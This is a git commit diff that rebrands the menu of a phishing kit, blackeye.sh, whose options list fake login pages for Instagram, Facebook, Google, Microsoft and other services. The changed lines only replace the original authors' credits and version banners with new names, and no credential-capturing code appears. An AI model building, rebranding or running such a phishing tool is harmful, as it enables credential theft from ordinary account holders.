ccaf7610fe1642caa2811f3b56caf77fcc88ff6d
Rafin Ahmed <65747137+RafinAhmed44@users.noreply.github.com>
2020-06-11 16:20:39 +0600

    Add files via upload

--- blackeye.sh
+++ blackeye.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# BLACKEYE v1.1 is an upgrade from original Shymon Hasan Tool (https://github.com/Shymon-Hasan) by thelinuxchoice under GNU LICENSE 
+# SH.Sam v1.8 is an upgrade from original Shymon Hasan Tool (https://github.com/Shymon-Hasan) by Shymon-Hasan under GNU LICENSE 
 # Coded by: @Shymon-Hasan (https://github.com/Shymon-Hasan) Give me the credits if copy ANY part from this code. Don't be NOOB!!
 # Upgraded by: @Shymon-Hasan (https://github.com/Shymon-Hasan)
 # Credits (Copyright)
@@ -25,7 +25,7 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 menu() {
 
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m BLACKEYE  v1.1\e[0m\n"                                
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m Rafin Vau  v1.8\e[0m\n"                                
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m                  ╭━━━┳╮╱╭╮╭━━━┳━━━┳━╮╭━╮\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest   \e[0m             ┃╭━╮┃┃╱┃┃┃╭━╮┃╭━╮┃┃╰╯┃┃\n"
 printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m CryptoCurrency   \e[0m        ┃╰━━┫╰━╯┃┃╰━━┫┃╱┃┃╭╮╭╮┃\n"                
@@ -34,7 +34,7 @@ printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         
 printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m Adobe ID   \e[0m              ╰━━━┻╯╱╰╯╰━━━┻╯╱╰┻╯╰╯╰╯\n"
 printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m           \e[1;94m CODED BY:  @Shymon-Hasan\e[0m\n"
 
-printf "                                                \e[1;94m UPGRADED BY: @suljot_gjoka\e[0m\n"
+printf "                                                \e[1;94m UPGRADED BY: @Shymon-Hasan\e[0m\n"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
 
